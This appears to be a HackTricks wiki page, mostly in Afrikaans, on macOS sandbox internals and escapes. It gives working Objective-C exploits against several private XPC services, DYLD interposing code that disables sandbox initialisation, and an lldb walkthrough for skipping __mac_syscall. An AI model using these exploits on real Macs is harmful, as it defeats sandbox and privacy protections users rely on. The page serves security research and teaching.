# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Sandbox laai proses

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Beeld van <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

In die vorige beeld is dit moontlik om te observeer **hoe die sandbox gelaai sal word** wanneer 'n toepassing met die regte **`com.apple.security.app-sandbox`** uitgevoer word.

Die kompilator sal `/usr/lib/libSystem.B.dylib` aan die binêre koppel.

Dan sal **`libSystem.B`** ander verskeie funksies aanroep totdat die **`xpc_pipe_routine`** die regte van die app na **`securityd`** stuur. Securityd kontroleer of die proses in die Sandbox gequarantine moet word, en indien wel, sal dit gequarantine word.\
Laastens sal die sandbox geaktiveer word met 'n oproep na **`__sandbox_ms`** wat **`__mac_syscall`** sal aanroep.

## Moglike Bypasses

### Om die kwarantynattribuut te omseil

**Lêers wat deur sandboxed prosesse geskep is** word met die **kwarantynattribuut** aangeheg om sandbox ontsnapping te voorkom. As jy egter daarin slaag om **'n `.app`-map sonder die kwarantynattribuut** binne 'n sandboxed toepassing te skep, kan jy die app-bundel binêre laat wys na **`/bin/bash`** en 'n paar omgewingsveranderlikes in die **plist** voeg om **`open`** te misbruik om **die nuwe app sonder sandbox te begin**.

Dit is wat gedoen is in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**

> [!CAUTION]
> Daarom, op die oomblik, as jy net in staat is om 'n map met 'n naam wat eindig op **`.app`** is sonder 'n kwarantynattribuut te skep, kan jy die sandbox ontsnap omdat macOS net die **kwarantyn** attribuut in die **`.app`-map** en in die **hoofd uitvoerbare** kontroleer (en ons sal die hoofd uitvoerbare na **`/bin/bash`** wys).
>
> Let daarop dat as 'n .app-bundel reeds gemagtig is om te loop (dit het 'n kwarantyn xttr met die gemagtigde om te loop-vlag aan), kan jy dit ook misbruik... behalwe dat jy nou nie binne **`.app`**-bundels kan skryf nie tensy jy 'n paar bevoorregte TCC-perms het (wat jy nie binne 'n sandbox hoog sal hê nie).

### Misbruik van Open-funksionaliteit

In die [**laaste voorbeelde van Word sandbox omseiling**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) kan gesien word hoe die **`open`** cli-funksionaliteit misbruik kan word om die sandbox te omseil.

{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Begin Agents/Daemons

Selfs al is 'n toepassing **bedoel om sandboxed te wees** (`com.apple.security.app-sandbox`), is dit moontlik om die sandbox te omseil as dit **uitgevoer word vanaf 'n LaunchAgent** (`~/Library/LaunchAgents`) byvoorbeeld.\
Soos verduidelik in [**hierdie pos**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), as jy volharding met 'n toepassing wat sandboxed is wil verkry, kan jy dit laat outomaties uitvoer as 'n LaunchAgent en dalk kwaadwillige kode via DyLib-omgewingsveranderlikes inspuit.

### Misbruik van Auto Start Plekke

As 'n sandboxed proses kan **skryf** in 'n plek waar **later 'n onsandboxed toepassing die binêre gaan uitvoer**, sal dit in staat wees om te **ontsnap net deur** die binêre daar te plaas. 'n Goeie voorbeeld van hierdie soort plekke is `~/Library/LaunchAgents` of `/System/Library/LaunchDaemons`.

Vir dit mag jy selfs **2 stappe** nodig hê: Om 'n proses met 'n **meer toelaatbare sandbox** (`file-read*`, `file-write*`) jou kode te laat uitvoer wat werklik in 'n plek sal skryf waar dit **onsandboxed uitgevoer sal word**.

Kyk na hierdie bladsy oor **Auto Start plekke**:

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Misbruik van ander prosesse

As jy vanaf die sandbox proses in staat is om **ander prosesse** wat in minder beperkende sandboxes (of geen) loop te **kompromitteer**, sal jy in staat wees om na hul sandboxes te ontsnap:

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Beskikbare Stelsel en Gebruiker Mach dienste

Die sandbox laat ook kommunikasie met sekere **Mach dienste** via XPC gedefinieer in die profiel `application.sb`. As jy in staat is om een van hierdie dienste te **misbruik**, mag jy in staat wees om die **sandbox te ontsnap**.

Soos aangedui in [hierdie skrywe](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), is die inligting oor Mach dienste gestoor in `/System/Library/xpc/launchd.plist`. Dit is moontlik om al die Stelsel en Gebruiker Mach dienste te vind deur binne daardie lêer te soek na `<string>System</string>` en `<string>User</string>`.

Boonop is dit moontlik om te kontroleer of 'n Mach diens beskikbaar is vir 'n sandboxed toepassing deur die `bootstrap_look_up` aan te roep:
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### Beskikbare PID Mach dienste

Hierdie Mach dienste is aanvanklik misbruik om [uit die sandbox te ontsnap in hierdie skrywe](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). Teen daardie tyd was **alle die XPC dienste wat deur** 'n toepassing en sy raamwerk vereis word, sigbaar in die app se PID-domein (dit is Mach Dienste met `ServiceType` as `Application`).

Om **met 'n PID Domein XPC diens te kommunikeer**, is dit net nodig om dit binne die app te registreer met 'n lyn soos:
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
Boonop is dit moontlik om al die **Application** Mach dienste te vind deur in `System/Library/xpc/launchd.plist` te soek na `<string>Application</string>`.

'n Ander manier om geldige xpc dienste te vind, is om diegene in te kyk:
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
Verskeie voorbeelde wat hierdie tegniek misbruik, kan gevind word in die [**oorspronklike skrywe**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), egter, die volgende is 'n paar saamgevatte voorbeelde.

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Hierdie diens laat elke XPC-verbinding toe deur altyd `YES` terug te gee en die metode `runTask:arguments:withReply:` voer 'n arbitrêre opdrag uit met arbitrêre parameters.

Die ontploffing was "so eenvoudig soos":
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Hierdie XPC-diens het elke kliënt toegelaat deur altyd YES terug te gee en die metode `createZipAtPath:hourThreshold:withReply:` het basies toegelaat om die pad na 'n gids aan te dui om te komprimeer en dit sal dit in 'n ZIP-lêer komprimeer.

Daarom is dit moontlik om 'n vals app-gidsstruktuur te genereer, dit te komprimeer, dan te dekomprimeer en dit uit te voer om die sandbox te ontsnap, aangesien die nuwe lêers nie die kwarantyn-attribuut sal hê nie.

Die uitbuiting was:
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Hierdie XPC-diens stel in staat om lees- en skryftoegang aan 'n arbitrêre URL aan die XPC-kliënt te gee via die metode `extendAccessToURL:completion:` wat enige verbinding aanvaar. Aangesien die XPC-diens FDA het, is dit moontlik om hierdie toestemmings te misbruik om TCC heeltemal te omseil.

Die ontploffing was:
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### Statiese Kompilering & Dinamiese Koppeling

[**Hierdie navorsing**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) het 2 maniere ontdek om die Sandbox te omseil. Omdat die sandbox toegepas word vanaf gebruikersvlak wanneer die **libSystem** biblioteek gelaai word. As 'n binêre dit kon vermy om dit te laai, sou dit nooit in die sandbox wees nie:

- As die binêre **heeltemal staties gekompileer** was, kon dit vermy om daardie biblioteek te laai.
- As die **binêre nie enige biblioteek hoef te laai nie** (omdat die linker ook in libSystem is), sal dit nie libSystem hoef te laai nie.

### Shellcodes

Let daarop dat **selfs shellcodes** in ARM64 gekoppel moet word in `libSystem.dylib`:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Nie geërfde beperkings

Soos verduidelik in die **[bonus van hierdie skrywe](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)** 'n sandbox-beperking soos:
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
kan omseil word deur 'n nuwe proses wat uitvoer byvoorbeeld:
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
However, of course, this new process won't inherit entitlements or privileges from the parent process.

### Entitlements

Let wel, selfs al mag sommige **actions** **toegelaat word deur die sandbox** as 'n toepassing 'n spesifieke **entitlement** het, soos in:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

Vir meer inligting oor **Interposting** kyk:

{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer` om die sandbox te voorkom
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interpost `__mac_syscall` om die Sandbox te voorkom
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Foutopsporing & omseiling van Sandbox met lldb

Kom ons compileer 'n toepassing wat in 'n sandbox moet wees:

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

Dan kompileer die app:
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> Die aansoek sal probeer om die lêer **`~/Desktop/del.txt`** te **lees**, wat die **Sandbox nie sal toelaat**.\
> Skep 'n lêer daar, aangesien die Sandbox oorgestap is, sal dit in staat wees om dit te lees:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Kom ons debugg die aansoek om te sien wanneer die Sandbox gelaai word:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Selfs met die Sandbox omseil, sal TCC** die gebruiker vra of hy wil toelaat dat die proses lêers van die lessenaar lees

## References

- [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
- [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

{{#include ../../../../../banners/hacktricks-training.md}}
